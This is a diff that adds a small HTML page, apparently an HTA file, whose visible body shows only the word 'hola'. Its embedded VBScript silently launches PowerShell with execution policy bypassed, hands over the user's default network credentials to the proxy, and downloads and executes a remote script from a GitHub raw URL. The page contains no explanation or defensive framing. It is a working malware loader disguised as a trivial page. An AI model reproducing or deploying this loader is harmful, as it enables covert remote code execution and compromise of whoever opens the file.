@@ -1,0 +1,13 @@
+<html>
+	<script language="VBScript">
+		Set objShell = CreateObject("Wscript.Shell")
+		sCmd = "POWERshelL -nop -exec bypass -c (New-Object System.Net.WebClient).Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/kobebryamv2/amistoso/master/pws')"
+		
+		iResult = objShell.Run(sCmd, 0, true)
+		
+		close
+	</script>
+  <body>
+  <h1>hola</h1>
+  </body>
+</html>
